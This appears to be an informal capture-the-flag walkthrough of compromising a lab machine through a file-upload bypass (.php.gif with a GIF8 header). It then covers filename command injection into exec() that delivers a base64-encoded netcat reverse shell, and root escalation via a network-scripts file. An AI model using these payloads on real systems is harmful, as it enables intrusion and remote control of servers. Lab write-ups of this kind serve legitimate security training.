we found a back up file with upload codes in it

and a upload.php

we first trid to inject ==php system cmd comamnd in comments== using exiftool and get a rce but couldnot do it

as 500 page error

so we did chose rev.php and

```
------WebKitFormBoundaryItAZ1OAxQTB8rmbI
Content-Disposition: form-data; name="myFile"; filename="req.php.gif"
Content-Type: image/gif

GIF8;

we changed the file name to .php.gif and added a ==GIF8==; or GIF89a; wirh GIF it was not working

we got a shell

the code which was exploitable was  `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`

as $value above is used as a key to iterate over all the file names so if we did ;  a ==semicolon== the query will break and we can execute our code in there

so we nc -e /bin/bash 10.10.14.9 5555 and base64 encoded it

`touch 'a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b'`

and we got shell

in directory we found a file `/etc/sysconfig/network-scripts/ifcfg-gul`

this can be exploited by a simple shell ==/bin/bash==

it asks for input if we give input like `a /bin/bash`

it gives shell as root.
